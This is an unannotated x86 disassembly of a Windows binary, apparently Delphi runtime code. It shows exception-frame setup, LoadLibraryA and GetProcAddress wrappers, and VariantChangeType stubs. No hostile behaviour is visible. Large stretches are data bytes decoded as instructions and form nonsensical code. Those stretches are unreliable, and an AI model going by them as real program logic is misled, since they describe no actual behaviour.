call sub_40d1ac
test al al
jne r-xdata
mov al 0x1
sub_40d268
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d2da
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d2bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404510
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2c3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d2ec
sbb eax 0x4000000
add [ edi ] 0xffffffcc
fwait
inc edi
add ah bh
add [ edi ] 0x4c
0x82f40047 0x47
pushfd
xchg edi eax
inc edi
add ah ch
add [ edi ] 0x40
pushfd
inc edi
add ah ah
add [ edi ] 0x90
pushfd
inc edi
add ah bl
add [ edi ] 0xe0
cwde
inc edi
add ah dl
add [ edi ] 0x2c
0x82cc0047 0x47
inc eax
xchg edi eax
inc edi
add ah al
add [ edi ] 0xa4
0x82bc0047 0x47
and [ ebx - 0x7d4bffb9 ] bl
inc edi
add al ah
cdq
inc edi
add [ edx + eax * 4 - 0x660fffb9 ] ch
inc edi
add [ edx + eax * 4 - 0x62cbffb9 ] ah
inc edi
add [ edx + eax * 4 - 0x6613ffb9 ] bl
inc edi
add [ edx + eax * 4 - 0x620fffb9 ] dl
inc edi
add [ edx + eax * 4 - 0x647fffb9 ] cl
inc edi
add [ edx + eax * 4 - 0x64afffb9 ] al
inc edi
add [ edx + eax * 4 + 0x47 ] bh
add [ eax ] cl
sahf
inc edi
add [ edx + eax * 4 + 0x47 ] dh
add [ eax + 0x6c00479d ] dl
add [ edi ] 0x4
0x82640047 0x47
cmp al 0x9d
inc edi
add [ edx + eax * 4 + 0x47 ] bl
add [ eax - 0x63 ] bl
inc edi
add [ edx + eax * 4 + 0x47 ] dl
add al al
cwde
inc edi
add [ edx + eax * 4 + 0x47 ] cl
add [ eax - 0x68 ] al
inc edi
add [ edx + eax * 4 + 0x47 ] al
add [ eax - 0x65 ] al
inc edi
add [ edx + eax * 4 ] bh
inc edi
add [ esp + ebx * 4 ] dh
inc edi
add [ edx + eax * 4 ] dh
inc edi
add [ edi + edx * 4 + 0x47 ] cl
add [ edx + eax * 4 ] ch
inc edi
add [ eax ] dh
popfd
inc edi
add [ edx + eax * 4 ] ah
inc edi
add ah bh
cdq
inc edi
add [ eax ] ch
add [ eax ] al
add [ edx + eax * 4 ] bl
inc edi
add [ eax ] dl
popfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ edi ] 0xa8
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] dl
inc edi
add [ eax ] ah
pushfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edi ] 0x58
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] cl
inc edi
add [ eax + 0x4798 ] al
add [ eax ] al
add [ eax ] cl
add [ edi ] 0x70
cwde
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax * 4 ] al
inc edi
add ah dl
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0xf8
cdq
inc edi
add [ eax ] al
add [ eax ] al
add ah bh
add [ edi ] rw-data
add [ eax ] al
add [ eax ] al
clc
add [ edi ] rw-data
add [ eax ] al
add [ eax ] al
hlt
sub_40d73c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d7a4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7ab
retn
mov eax sub_40d2ec
call sub_403d78
mov eax r-xdata
call sub_403da0
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bc4c
call sub_40bd50
call sub_40cd28
call sub_40c64c
mov eax rw-data
mov edx r-xdata
call sub_4040a4
sub_40d7dc
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d830
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d88a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4080d8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d891
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40d89c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d8f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094e4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8fd
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40d908
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d962
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4094b8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d969
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40d974
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d9ce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40acfc
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9d5
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40d9e0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da3a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409510
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da41
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40da4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dab9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4042d8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4081c4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dac0
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_40dacc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db2c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40946c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40487c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db33
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40db3c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40db9c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a4bc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_40487c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dba3
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40dbac
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dc10
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408260
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_40487c
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc17
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40dc40
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dc6c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d7dc
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d80c
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d80c
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d818
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d824
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d830
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d89c
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d908
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d974
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9e0
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da4c
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dacc
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db3c
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbac
mov eax r-xdata
call sub_40dc40
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40df78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40df9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfa4
retn
sub_40e0d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and cl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0040 ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45160040 ] al
push esi
popad
jb r-xdata
add [ eax ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
jo r-xdata
popad
outsb
je r-xdata
ror [ edx + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
jb r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
push esi
popad
jb r-xdata
outsb
jbe r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
add [ eax ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc ecx
jb r-xdata
inc eax
add [ edx + esi + 0x45150040 ] al
push esi
popad
jb r-xdata
jns r-xdata
add [ edx + esi ] ch
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x40 ] cl
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] dh
add [ eax ] al
add [ edi + esi * 2 + 0x40 ] ah
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
jbe r-xdata
popad
outsb
je r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
dec esp
loop r-xdata
popad
jae r-xdata
inc ebx
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xe2
inc eax
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
loop r-xdata
outsd
jb r-xdata
popad
jb r-xdata
test cl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
push esi
popad
jb r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
test [ edx ] dh
inc eax
add [ edi ] dl
inc ebp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] dl
jecxz r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe3
outsd
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
add [ eax ] al
add [ eax ] al
outsb
js r-xdata
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
shr al 0xe1
inc eax
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
push esi
popad
jb r-xdata
jb r-xdata
aam 0x34
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1d ] bh
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
loope r-xdata
jb r-xdata
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test cl ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
lea eax [ eax ]
and cl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
loope r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
outsd
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
nop
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
jb r-xdata
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jecxz r-xdata
inc eax
sar [ eax - 0x1d ] 0x40
add [ eax ] al
popad
jns r-xdata
add al bl
xor al 0x40
add ah cl
xor al 0x40
aam 0x34
inc eax
popad
outsd
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
je r-xdata
popad
inc eax
add [ esp + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
in al 0x40
add [ eax + eax ] cl
popad
outsb
je r-xdata
jb r-xdata
popad
add [ eax ] al
add ah al
xor al 0x40
add [ edx + esi ] ch
inc eax
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ eax - 0x1c ] cl
inc eax
sub al 0x32
dec bp
insd
outsd
jb r-xdata
sub al 0x32
outsd
add [ eax ] al
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
push esi
popad
jb r-xdata
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45140040 ] al
push esi
popad
jb r-xdata
inc eax
jb r-xdata
add [ eax ] al
ja r-xdata
add [ eax ] al
jb r-xdata
add ah al
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
outsd
jb r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
ja r-xdata
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ edx + esi ] ch
inc eax
insd
add [ eax ] al
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45170040 ] al
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
jo r-xdata
popad
je r-xdata
inc eax
add al ah
jecxz r-xdata
dec ebp
in al 0x8b
mov ebx eax
popad
je r-xdata
add [ edx + esi + 0x45150040 ] al
push esi
popad
jb r-xdata
outsb
js r-xdata
push ebp
push sub_40e5da
push [ fs : eax ]
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] al
add [ eax ] al
outsd
xor al 0x40
add [ edx + esi ] ch
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
push esi
popad
jb r-xdata
xor eax eax
push ebp
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
add esp 0xffffffe4
push ebx
popad
outsb
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
je r-xdata
add [ eax ] al
ja r-xdata
inc eax
add [ 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe5
inc eax
add [ eax + eax ] cl
js r-xdata
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0040 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0040 ] ch
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5e1
lea eax [ ebp - 0x4 ]
call sub_404050
retn
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
push esi
popad
jb r-xdata
add [ edi ] dl
inc ebp
inc eax
jb r-xdata
push sub_40e673
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102d4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102d4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e67a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404074
retn
jb r-xdata
outsd
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
cld
add [ eax ] al
add [ eax ] al
in eax 0x40
jns r-xdata
sub_40e590
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5da
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5e1
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_40e5e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e673
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102d4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102d4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e67a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404074
retn
sub_40e680
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
